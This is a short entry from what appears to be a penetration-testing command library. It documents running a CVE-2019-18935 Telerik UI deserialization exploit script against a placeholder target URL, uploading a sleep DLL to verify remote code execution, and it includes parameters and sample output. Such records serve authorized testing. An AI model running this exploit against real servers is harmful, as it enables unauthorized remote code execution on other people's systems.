---
id: cmd-upload-specific-dll
data: >-
  python3 CVE-2019-18935.py -u
  https://target/apps/XTRAHome/Telerik.Web.UI.WebResource.axd?type=rau -v
  2016.2.607 -f 'C:\Windows\Temp' -p sleep_2020051106245038_amd64.dll
tags:
  - rce
  - verification
type: command
output: >-
  [*] Local payload name: sleep_2020051106245038_amd64.dll ... {'fileInfo':
  {...}} ... [*] Response time: 11.47 seconds
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:33.123Z'
verified: false
validated: true
submitted: true
---
# upload-and-trigger-specific-dll

## Command

```bash
python3 CVE-2019-18935.py -u https://target/apps/XTRAHome/Telerik.Web.UI.WebResource.axd?type=rau -v 2016.2.607 -f 'C:\Windows\Temp' -p sleep_2020051106245038_amd64.dll
```

## Description

Executes the deserialization exploit with a specific compiled DLL to demonstrate and verify RCE, capturing detailed output for validation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -u | Target URL | Yes |
| -v | Version | Yes |
| -f | Folder | Yes |
| -p | Specific DLL | Yes |

## Examples

### Basic Usage

```bash
python3 CVE-2019-18935.py -u https://target/apps/XTRAHome/Telerik.Web.UI.WebResource.axd?type=rau -v 2016.2.607 -f 'C:\Windows\Temp' -p sleep_2020051106245038_amd64.dll
```

### Advanced Usage

N/A

## Expected Output

Detailed log including payload name, fileInfo, and response time confirming execution.

## Related

- [[commands/upload-and-trigger-dll-poc]]
